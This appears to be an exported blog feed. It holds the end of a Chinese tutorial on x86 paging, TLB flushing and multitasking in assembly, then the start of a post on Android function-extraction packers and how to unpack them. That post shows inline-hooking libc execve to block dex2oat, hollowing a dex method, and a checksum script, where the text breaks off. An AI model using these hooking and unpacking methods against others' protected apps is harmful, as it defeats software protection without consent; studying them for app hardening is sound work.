<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/07556a53fea08215d82d60162499308e-166833015581969.png" class="">

<ul>
<li>处理器用线性地址的<strong>高20位</strong>查找<strong>TLB</strong>中的行，查找标记相同的行。找到之后就使用其数据部分的<strong>页物理地址</strong>转换当前线性地址</li>
<li>若查找不成功，则处理器还要访问内存中的页目录表和页表，找到对应的页表项，将其填写到<strong>TLB</strong>中。</li>
</ul>
<p><strong>TLB</strong>的容量不大，若装满之后还需要置换掉那些使用较少的条目。<strong>TLB</strong>中的属性位来自于页表项如<strong>D位</strong>。访问权来自于页目录项，如<strong>RW位</strong>、<strong>US位</strong>，具体取页目录项还是页表中的值，若页目录的<strong>RW = 0</strong>、页表项的<strong>RW = 1</strong>，按照<strong>RW = 0</strong>执行，即取最严格的权限执行 （等于是将访问权进行<strong>与操作</strong>）。</p>
<p>处理器仅仅缓存那些<strong>P位 = 1</strong>的页表项，而且<strong>TLB</strong>的工作和<strong>CR3</strong>寄存器的<strong>PCD、PWT</strong>无关，另外对于页表项的修改不会同时反映到<strong>TLB</strong>中。</p>
<p>如果内存表中的页表项已经修改，对应<strong>TLB</strong>中的条目还没有被更新，那么转换后的物理地址必定是错误的。</p>
<p>在本章里，内核任务页目录表的前一半用于创建用户任务，所以是频繁更新的，在创建用户任务时，必须先清除这一部分页目录项并刷新<strong>TLB</strong>。否则处理器将使用缓存的页表项访问内存，将会产生错误。</p>
<p><strong>TLB</strong>的内容或条目不可由软件直接访问的，所以不能直接更改或刷新它的内容，但是有其它办法刷新，比如将<strong>CR3</strong>的内容读出再原样写入，这样就会使得<strong>TLB</strong>中的所有条目失效。当任务切换时因为需要从新任务的<strong>TSS</strong>中加载<strong>CR3</strong>，这样会隐式的导致<strong>TLB</strong>的所有条目无效并重新刷新。</p>
<p>上述方法对那些<strong>G位 = 1</strong>的表项是无效的，被设置为全局的页表项应该始终被缓存在<strong>TLB</strong>中，在前面我们已经清空了页目录表的前半部分，为了使<strong>TLB</strong>的条目失效，需要重新加载<strong>CR3</strong>.</p>
<h2 id="25-为用户任务分配内存并创建LDT"><a href="#25-为用户任务分配内存并创建LDT" class="headerlink" title="25. 为用户任务分配内存并创建LDT"></a>25. 为用户任务分配内存并创建LDT</h2><p>接上一节，在清空内核任务页目录表的前半部分并刷新了<strong>TLB</strong>之后，就可以分配内存并加载用户程序了，本节代码如下：</p>
<pre><code class="assembly">mov esi,[ebp+11*4]                 ;从堆栈中取得TCB的基地址

         ;以下申请创建LDT所需要的内存
         mov ebx,esi
         mov ecx,160                        ;允许安装20个LDT描述符
         call sys_routine_seg_sel:task_alloc_memory
         mov [es:esi+0x0c],ecx              ;登记LDT基地址到TCB中
         mov word [es:esi+0x0a],0xffff      ;登记LDT初始的界限到TCB中  
</code></pre>
<p>申请内存：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/fc207a4863236bff10f6dae579f1fc5e-166833015581970.png" class="">
<p><strong>情况1</strong>：</p>
<ul>
<li>对于任何一个正在执行的任务，若要申请额外的内存空间，可以调用例程<strong>allocate_memory</strong></li>
<li>例程<strong>allocate_memory</strong>需要调用<strong>task_allocate_memory</strong>，需要当前任务自己的TCB作为参数，所以例程<strong>allocate_memory</strong>需要获得当前任务控制块<strong>TCB</strong></li>
<li>例程<strong>task_allocate_memory</strong>需要访问<strong>TCB</strong>，来确定本次内存分配器始于哪个线性地址，并根据分配的内存数量确定一个地址范围</li>
<li>若当前任务是内核任务，那么这个线性地址范围一定位于虚拟线性地址的高端、普通任务则位于虚拟线性地址的低端</li>
<li>确定线性地址范围之后，调用<strong>alloc_inst_a_page</strong>来分配和安装与线性地址相关的物理页。首先检查当前任务的页目录表和页表，看一下表项是否存在。存在说明之前分配过，直接返回</li>
<li>不存在，则调用例程<strong>allocate_a_4k_page</strong>在物理页中查找并返回空闲的物理页地址</li>
<li>无论如何，例程<strong>alloc_inst_a_page</strong>都是在当前任务的页目录和页表中登记线性地址与物理页的对应关系。</li>
</ul>
<p><strong>情况2</strong>：<br>在一个任务被创建并开始执行之前，需要先创建这个任务自己的虚拟内存空间，并在这个虚拟内存空间里分配用来加载这个任务的代码和数据。用户任务的创建是内核任务的工作，所以需要有内核任务代替用户任务来完成内存的创建和分配。</p>
<p>因为这个原因，需要借用内核任务页目录的前半部分来分配内存，内存分配完成用户任务创建之后，再将内核任务的页目录表复制一份给用户任务就可以了</p>
<p>有内核任务代替用户任务分配内存时，内核任务需要拿着用户任务的<strong>TCB</strong>来调用例程<strong>task_allocate_memory</strong>。毕竟内存分配是在用户任务自己的虚拟空间中进行，需要从用户任务自己的<strong>TCB</strong>中取得本次分配需要的线性地址。虽然是为用户任务分配内存，但却是在内核任务的页目录表中登记了页目录表项，这没关系后面直接复制一份即可。</p>
<h2 id="26-用户程序的加载和重定位"><a href="#26-用户程序的加载和重定位" class="headerlink" title="26. 用户程序的加载和重定位"></a>26. 用户程序的加载和重定位</h2><p>上一节已经为<strong>LDT</strong>分配了内存，接下来就是从硬盘读取用户程序</p>
<p>加载用户程序头部读取用户程序总字节数、将用户程序总字节数换算为总扇区数、循环读取用户程序剩余部分、建立用户程序的段描述符：</p>
<p>用户程序的<strong>SALT</strong>在用户程序头部段中，但是用户程序头部段暂时不能访问，因为当前任务是内核任务而不是用户任务</p>
<p>现在考虑一下用户程序什么能访问、什么不能访问，我们现在是在内核虚拟空间的低2GB虚拟空间里分配内存并加载用户程序，所以加载之后的内容是可以访问到的，不过现在是借助内核地址空间来访问的。</p>
<p>现在创建了用户程序的段选择子和段描述符，但是不能使用，因为这些段位于用户任务的<strong>LDT</strong>中，只有<strong>LDTR</strong>寄存器指向这个<strong>LDT</strong>才能访问这些段。但是当前是在内核任务中，是没有<strong>LDT</strong>的</p>
<p>之后重定位<strong>SALT</strong>、创建用户程序调用门0、1、2特权级的栈、在<strong>GDT</strong>中登记<strong>LDT</strong>描述符、创建用户程序的<strong>TSS</strong>、登记基本的<strong>TSS</strong>表格内容、访问用户程序头部段，获取数据填充<strong>TSS</strong>、在<strong>GDT</strong>中登记<strong>TSS</strong>描述符、创建用户任务的页目录，最后返回调用者。</p>
<h2 id="27-用户任务页目录表的创建和访问以及INVLPG指令"><a href="#27-用户任务页目录表的创建和访问以及INVLPG指令" class="headerlink" title="27. 用户任务页目录表的创建和访问以及INVLPG指令"></a>27. 用户任务页目录表的创建和访问以及INVLPG指令</h2><p>接上一节，当用户任务的加载和创建结束时，需要将内核任务的页目录表复制给用户任务。代码如下：</p>
<pre><code class="assembly">         ;创建用户任务的页目录
         ;注意！页的分配和使用是由页位图决定的，可以不占用线性地址空间
         call sys_routine_seg_sel:create_copy_cur_pdir
         mov ebx,[es:esi+0x14]              ;从TCB中获取TSS的线性地址
         mov dword [es:ebx+28],eax          ;填写TSS的CR3(PDBR)域   
</code></pre>
<p>例程<strong>create_copy_cur_pdir</strong>：</p>
<pre><code class="assembly">create_copy_cur_pdir		;创建新页目录，并复制当前页目录内容
                      		;输入：无
                          	;输出：EAX=新页目录的物理地址
    push ds
    push es
    push esi
    push edi
    push ebx
    push ecx
    
    mov ebx,mem_0_4_gb_seg_sel     ;指向4G字节的段，为访问两个
    mov ds,ebx                     ;页目录表做准备
    mov es,ebx
    
    call allocate_a_4k_page
    mov ebx,eax		;EAX时这个页的基地址
    or ebx,0x00000007
    mov [0xfffffff8],ebx
    
    invlpg [0xfffffff8]		;刷新处理器的TLB中的条目
                            ;这个页目录项位于内核任务的页目录表中 
                            ;每当我们创建一个新的用户任务时，都用它来指向新任务的页目录表
                            ;修改这个表项时，修改的是内存中的，其在TLB中还有一个缓存
                            ;这个缓存的内容通常指向上一个任务的页目录表，因为我们在反复创建新任务
                            ;所以需要强制刷新这个缓存，与当前内存中的表项保持一致
                            
    mov esi,0xfffff000		;ESI-&gt;当前页目录的线性地址
    mov edi,0xffffe000		;EDI-&gt;新页目录的线性地址
    mov ecx,1024			;ECX=要复制的目录项数
    cld						;传送方向为正，从底到高
    repe movsd     			;需要使用两个段寄存器
                            ;movsd表示每次传送一个字
                            ;源操作数位于DS、目的操作数位于ES中
    
    pop ecx
    pop ebx
    pop edi
    pop esi
    pop es
    pop ds
    
    retf
</code></pre>
<p>为了能访问到这个4K字节页，把其物理地址登记到当前页目录表的倒数第二个表项中，即表内偏移<strong>0xFF8</strong>地址处。这个表项的线性地址为：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/86a5e81c6f38a69aa6a7f214ed2c8fd9-166833015581971.png" class="">
<p>所以程序中，将附加了属性的页地址登记到这个线性地址处<strong>mov [0xfffffff8], ebx</strong>。</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/70d154c87cbdd47bdabab6d6f7a1f256-166833015581972.png" class="">
<p>其中指令<strong>invlpg(Invalidate TLB Entry)<strong>用于刷新</strong>TLB</strong>中的单个条目。<strong>TLB</strong>是一个附加的硬件机构，只有处理器正常访问内存时才会导致它的填充和更新。</p>
<p>这条指令是特权指令，在保护模式下执行的特权级必须是0，此指令不影响任何标志位。</p>
<p>为什么新页目录表的线性地址是<strong>0xFFFFE000</strong>呢？</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/944f6f04ee6e0be26a785c13e719da30-166833015581973.png" class="">

<h2 id="28-第二个用户任务的创建和分页模式下的任务切换"><a href="#28-第二个用户任务的创建和分页模式下的任务切换" class="headerlink" title="28. 第二个用户任务的创建和分页模式下的任务切换"></a>28. 第二个用户任务的创建和分页模式下的任务切换</h2><p>在加载和创建用户任务之后，处于就绪状态，随时可以执行。在本章中任务切换是自动进行的，是由一个实时时钟信号驱动的，时钟芯片每秒钟发出一个中断信号，中断发生时处理器执行设置好的中断处理过程。这个中断处理过程就用于执行任务切换。</p>
<p>中断处理过程就是<strong>rtm_0x70_interrupt_handle</strong>例程，调用<strong>initiate_task_switch</strong>从<strong>TCB</strong>链表中找到当前状态为忙的任务将其状态改为就绪、再找到后面第一个就绪的任务将其状态设置为忙，切换任务执行。</p>
<p>一旦内核任务重新执行时，将执行后续指令：</p>
<pre><code class="assembly">    push dword 50                      	;用户程序位于逻辑50扇区
    push ecx                           	;压入任务控制块起始线性地址 
    call load_relocate_program
    call append_to_tcb_link            	;将此TCB添加到TCB链中
                                        ;此时有2个任务轮流执行
    
    
    ;可以创建更多的任务，例如：
    mov ecx,0x4a
    call sys_routine_seg_sel:allocate_memory
    mov word [es:ecx+0x04],0           	;任务状态：空闲
    mov dword [es:ecx+0x46],0          	;任务内可用于分配的初始线性地址
    
    push dword 100                     	;用户程序位于逻辑100扇区
    push ecx                           	;压入任务控制块起始线性地址
    
    call load_relocate_program
    call append_to_tcb_link            	;将此TCB添加到TCB链中
                                        ;此时有2个任务轮流执行
    
.do_switch:
    mov ebx,core_msg2
    call sys_routine_seg_sel:put_string
    
    ;清理已经终止的任务，并回收它们占用的资源
    call sys_routine_seg_sel:do_task_clean
    
    hlt			;停机之后，任何时候发生中断
                ;处理器将会被唤醒继续执行任务切换
    
    jmp .do_switch
</code></pre>
<p>用户程序和上一章相同：<strong>用户程序1</strong>打印<strong>，，，，，，…<strong>、</strong>用户程序2</strong>打印<strong>cccccc…</strong></p>
<pre><code class="assembly">SECTION code vstart=0
start:
    ;任务启动时，DS指向头部段，也不需要设置堆栈 
    mov eax,ds
    mov fs,eax
    
    mov ax,[data_seg]
    mov ds,ax
    
.do_prn:
    mov ebx,message_1
    call far [fs:PrintString]
    jmp .do_prn
    
    call far [fs:TerminateProgram]      ;退出，并将控制权返回到核心 
    
code_end:
</code></pre>
<h2 id="29-分页模式下多任务切换的演示和调试"><a href="#29-分页模式下多任务切换的演示和调试" class="headerlink" title="29. 分页模式下多任务切换的演示和调试"></a>29. 分页模式下多任务切换的演示和调试</h2><p>加载程序：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/dd6b2d1cf65101ab1157fdbf959c2e12-166833015581974.png" class="">

<p><strong>Virtual Box</strong>虚拟机：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/7c427b058ef8287c6591c609d62a8c86-166833015581975.png" class="">

<p><strong>Bochs</strong>虚拟机：<br>设置断点：<mark>b 0x7c00</mark><br>执行：<mark>c</mark><br>设置断点：<mark>modebp</mark>，会在模式切换时停下<br>设置断点在进入内核的时候：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/bc66e79cf2decf543a4c0de3902f257b-166833015581976.png" class="">
<p>设置断点在创建第一个用户程序之前：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2abbb8cf38ef0b7bc71cb4ff85c61f1c-166833015581977.png" class="">
<p>当前分页功能是关闭的：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/151a3202b0f470cfe608ee6cdc4f0e55-166833015581978.png" class="">
<p>执行到创建第一个用户程序这个断点之前：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/87d023f2b13c30f6f0248ee085d7f933-166833015581979.png" class="">
<p><strong>page</strong>命令解析线性地址是如何映射的：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2d207c40d4ed4aad351b0574c350c05c-166833015581980.png" class="">

<ul>
<li><strong>PDE行</strong>：第一行是该线性地址在页目录表中对应的表项，该表项填写了该线性地址对应页表的物理地址是<strong>0x21000</strong>，后面的<strong>023</strong>是属性信息，大写是1、小写是0</li>
<li><strong>PTE行</strong>：第二行是该线性地址在页表内的登记项，页的物理地址是0、属性信息是3</li>
<li>从这两行直到线性地址中<strong>0</strong>对应的物理地址也是<strong>0</strong></li>
</ul>
<p>再看一下高端线性地址的对应：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2232d584b1105c1c111a6d24dc4232bc-166833015581981.png" class="">

<ul>
<li>页表物理地址是<strong>0x21000</strong></li>
<li>这个物理页对应的物理页地址为<strong>0</strong>，之前把内核从低端映射到高端，那么这个地址就是高端的起始地址</li>
</ul>
<p>进入例程<strong>load_relocate_program</strong>：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/93f55c2f8dc74acbb1ea7606ee60f989-166833015581982.png" class="">
<p>设置断点在<strong>ret 8</strong>处：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/4cefb3a82b2456df50beb419a43bd04c-166833015581983.png" class="">
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/08d72b71dd46721eaa0f9158add23515-166833015581984.png" class="">
<p>前面是内核任务为用户任务设置的地址对应关系。</p>
<p>此时用户任务的线性地址<strong>0</strong>被映射为<strong>0x35000</strong>：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/2485ee1c3461410a66d0c7eef09f5509-166833015581985.png" class="">
<p><strong>blist</strong>命令查看设置过的断点信息：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/587119267467e85e47a9d50f2273e939-166833015581986.png" class="">
<p>第二个任务创建之后，线性地址<strong>0</strong>被映射为<strong>0x101000</strong></p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/f52abfb2fbdea7ddf2b8763e5a182598-166833015581987.png" class="">
<p>即对于不同的线性地址会被映射到不同的页中，其物理地址是不同的。</p>
<p>执行信息：</p>
<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/image-20221113170249308.png" class="" title="image-20221113170249308">
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>x86内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title>ART下抽取壳实现</title>
    <url>/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>函数抽取壳出现之后基本宣告一代壳整体保护的结束，由此进入到二代壳的时代。</p>
<p>接下来我们来分析一下二代壳的原理，看它在Dalvik&amp;ART下分别是怎么实现函数抽取的，以及如何脱二代壳。</p>
<span id="more"></span>

<h1 id="Dalvik下的函数抽取"><a href="#Dalvik下的函数抽取" class="headerlink" title="Dalvik下的函数抽取"></a>Dalvik下的函数抽取</h1><p>关于Dalvik下函数抽取壳的实现可以去看看《Android应用安全防护和逆向分析》的作者-姜维写的两篇文章和书中都有介绍</p>
<p><a href="http://www.520monkey.com/archives/1118">Android中实现「类方法指令抽取方式」加固方案原理解析</a></p>
<ul>
<li>这篇文章对dex的结构做了一个简单的介绍，怎么去定位函数指令的地址。最后实现了一个函数抽取壳的demo</li>
</ul>
<p><a href="http://www.520monkey.com/archives/1115">Android免Root权限通过Hook系统函数修改程序运行时内存指令逻辑</a></p>
<ul>
<li>这篇文章是前一篇文章的一个基础</li>
</ul>
<p><strong>这两篇文章介绍了在Dalvik下的函数抽取壳的原理和代码实现，实现函数抽取壳脱壳重要的一点是我们恢复这个函数的时机一定要早于这个函数被调用的时机，如果我们恢复的时机晚于被调用的时机的话那这个app的逻辑就被破坏掉了，APP自然就会崩溃。我们要保证当一个函数被调用，它的指令流必须是已经被修复了，这个就需要我们去分析源码来找到这个合适的时机点</strong></p>
<p>这里先看一下<a href="http://www.520monkey.com/archives/1118">Android中实现「类方法指令抽取方式」加固方案原理解析</a>这篇文章当中的时机点是怎么找的</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922234409887.png" class="" title="image-20230922234409887">

<ul>
<li>这篇文章里指令还原选用的是dexFindClass()，我们通过源码来看一下这个函数</li>
</ul>
<blockquote>
<p>我们前面讲过类加载的时候有三个步骤：</p>
<ol>
<li>装载：查找和导入Class文件</li>
<li>链接：其中解析步骤是可以选择的<ol>
<li>链接：其中解析步骤是可以选择的</li>
<li>准备：给类的静态变量分配存储空间</li>
<li>解析：将符号引用转成直接引用</li>
</ol>
</li>
<li>初始化：即调用**<clinit>**函数，对静态变量，静态代码块执行初始化工作</clinit></li>
</ol>
</blockquote>
<p>在这个类加载的过程中是有很多的时机供我们选择的。</p>
<p>先来看一下这个时机点</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230914213751277.png" class="" title="image-20230914213751277">

<p>当dex被加载完之后，就要去加载dex当中的类了：加载的时候又分两种方式。</p>
<blockquote>
<p>类加载的时机：</p>
<ol>
<li><p>隐式加载：</p>
<p>创建类的实例</p>
<p>访问类的静态变量，或者为静态变量赋值</p>
<p>调用类的静态方法</p>
<p>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</p>
<p>初始化某个类的子类</p>
</li>
<li><p>显示加载：两者又有所区别</p>
<p>使用LoadClass()加载</p>
<p>使用forName()加载</p>
</li>
</ol>
</blockquote>
<h2 id="下面我们先分析一下LoadClass-加载类的流程"><a href="#下面我们先分析一下LoadClass-加载类的流程" class="headerlink" title="下面我们先分析一下LoadClass()加载类的流程"></a>下面我们先分析一下LoadClass()加载类的流程</h2><ol>
<li><p>因为我们是用DexClassLoader加载dex的，所以从DexClassLoader开始进入去找LoadClass()</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916000421315.png" class="" title="image-20230916000421315">
</li>
<li><p>继续往下分析loadClass()</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916004845488.png" class="" title="image-20230916004845488">
</li>
<li><p>跟进去findClass()</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916012034450.png" class="" title="image-20230916012034450">
</li>
<li><p>跟进loadClassBinaryName()</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916012839402.png" class="" title="image-20230916012839402">

<ul>
<li>这里经过了几次调用直接进入了Native层</li>
</ul>
</li>
<li><p>接下来就进入了Native层</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916092311779.png" class="" title="image-20230916092311779">
</li>
<li><p>接下来进入findClassNoInit()</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916102228369.png" class="" title="image-20230916102228369">

<ul>
<li><p>这里的dexFindClass()就是我们前面要找的那个hook点，通过hook这个函数来实现对抽取函数的恢复解决方案。</p>
</li>
<li><p>整个原理等于是hook掉类被加载的时机来实现函数的恢复方案，这个时机肯定是在函数执行之前完成的，因此它也就能够保证APP的正常运行</p>
</li>
<li><p>往下继续分析也能找到其它的hook点，不过再往下可能就没有导出符号了，这个函数是有导出符号的可以直接在libdvm.so的导出函数找到（<code>android-4.4.4_r1/out/target/product/manta/symbols/system/lib/libdvm.so</code>），所以hook起来也容易一些。</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916105427130.png" class="" title="image-20230916105427130"></li>
</ul>
<p> <strong>到这里我们基本上搞清楚了这篇文章中Dalvik下函数抽取壳的原理</strong>，接下来我们去分析ART下的函数抽取壳原理</p>
</li>
</ol>
<h1 id="ART下的函数抽取以及修复"><a href="#ART下的函数抽取以及修复" class="headerlink" title="ART下的函数抽取以及修复"></a>ART下的函数抽取以及修复</h1><p>ART下修复dex有两种方案：</p>
<ol>
<li>禁掉dex2oat</li>
<li>在执行dex2oat之前填充修改dex</li>
</ol>
<p>首先看来第一种方案这种方案使用比较普遍，代价是牺牲掉了一部分运行效率，因为oat文件的运行效率要比dex文件高。但是，如果用第二种方案在dex2oat的过程中dex文件是完整的，很容易在编译流程中被完整的脱下来。</p>
<h2 id="禁用掉dex2oat的编译流程"><a href="#禁用掉dex2oat的编译流程" class="headerlink" title="禁用掉dex2oat的编译流程"></a>禁用掉dex2oat的编译流程</h2><p>再来看一下art下dexClassLoader()的加载，<strong>还是分析Android8.0的DexClassLoader流程</strong>，前面的流程在上一章分析过了，直接搜索GenerateOatFileNoChecks<em>（DexClassLoader加载dex的流程最终会进入到这里）</em>。</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916120243319.png" class="" title="image-20230916120243319">

<ol>
<li><p>进来之后往下找找能看到Dex2Oat()</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916151740306.png" class="" title="image-20230916151740306">
</li>
<li><p>继续跟踪</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230916152824758.png" class="" title="image-20230916152824758"></li>
</ol>
<ul>
<li>上面这些流程就是最终用来调用dex2oat的流程，打断这个流程即可终止对dex2oat二进制程序的调用</li>
</ul>
<h3 id="HOOK-execve"><a href="#HOOK-execve" class="headerlink" title="HOOK execve()"></a>HOOK execve()</h3><p><strong>接下来通过HOOK libc库中的execve()来打断对dex2oat的调用</strong></p>
<p>github上有类似的项目不过好多年没有更新了，对有些art版本可能已经不适用了<a href="https://github.com/asLody/TurboDex/tree/master">链接</a></p>
<p>hook代码：</p>
<pre><code class="C++">void hooklibc() {
    LOGD("go into hooklibc");
    //7.0 命名空间限制
    void *libc_addr = dlopen_compat("libc.so", RTLD_NOW);
    void *execve_addr = dlsym_compat(libc_addr, "execve");
    if (execve_addr != NULL) {
        if (ELE7EN_OK == registerInlineHook((uint32_t) execve_addr, (uint32_t) myexecve,
                                            (uint32_t **) &amp;oriexecve)) {
            if (ELE7EN_OK == inlineHook((uint32_t) execve_addr)) {
                LOGD("inlineHook execve success");
            } else {
                LOGD("inlineHook execve failure");
            }
        }
    }
}
</code></pre>
<p>还要重写execve的代码：让它判断一下如果是dex2oat调用的时候直接返回，如果不是也不影响它原来的流程</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230921165608812.png" class="" title="image-20230921165608812">

<pre><code class="C++">void* *myexecve(const char *__file, char *const *__argv, char *const *__envp) {
    LOGD("process:%d,enter execve:%s", getpid(), __file);
    if (strstr(__file, "dex2oat")) {
        return NULL;
    } else {
        return oriexecve(__file, __argv, __envp);
    }
}
</code></pre>
<ul>
<li>这样就可以停止它dex2oat的流程，接下来要找到一个时机点去还原被抽空的函数</li>
</ul>
<p><a href="https://bbs.kanxue.com/thread-254028.htm">参考寒冰的这篇文章</a></p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230921170635600.png" class="" title="image-20230921170635600">

<p><strong>这里手动修改dex抽取一个函数试一下，看一下函数抽取的流程</strong></p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922003852713.png" class="" title="image-20230922003852713">

<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922004358684.png" class="" title="image-20230922004358684">

<ul>
<li><p>首先要从这些类列表中找到我们要修改抽取的函数，我们可以看到这里面有一千多个类太多了，可以把它的结构导出搜索一下它的位置</p>
</li>
<li><p>找到之后我们来看一下dex文件格式的结构图，看函数抽取需要修改哪些内容</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922005501457.png" class="" title="image-20230922005501457">

<ul>
<li><p>函数抽取的关键就在于对codeItem部分进行修改</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922011727856.png" class="" title="image-20230922011727856">

<ul>
<li>这是它字节对应的结构，前16个字节对应它代表的结构信息，后面16个字节代表对应的代码指令</li>
</ul>
<p>这样寻找是为了去理解文件的结构，找起来比较麻烦，简单的办法是直接用jda打开函数用16禁止查看</p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922012756117.png" class="" title="image-20230922012756117">

<ul>
<li>定位到之后在010Editor里面按<strong>ctrl+G</strong>搜索这个地址即可</li>
</ul>
<p><strong>接下来我们如果要对函数进行抽空就需要对它的代码指令部分（后16个字节）进行清零</strong></p>
<img src="/2023/09/22/ART%E4%B8%8B%E6%8A%BD%E5%8F%96%E5%A3%B3%E5%AE%9E%E7%8E%B0/image-20230922013053840.png" class="" title="image-20230922013053840">

<p>代码指令部分修改完成之后还要重新计算校验和修改dex里面的checksum</p>
<ul>
<li><p>计算校验和脚本</p>
<pre><code class="python">#! /usr/bin/python
# -*- coding: utf8 -*-
import binascii  #删除缩进(Tab)

def CalculationVar(srcByte,vara,varb):#删除缩进(Tab)
    varA = vara
    varB = varb
    icount = 0
    listAB = []

    while icount &lt; len(srcByte):
        varA = (varA + srcByte[icount]) % 65521
        varB = (varB + varA) % 65521
        icount += 1

    listAB.append(varA)
    listAB.append(varB)

    return listAB

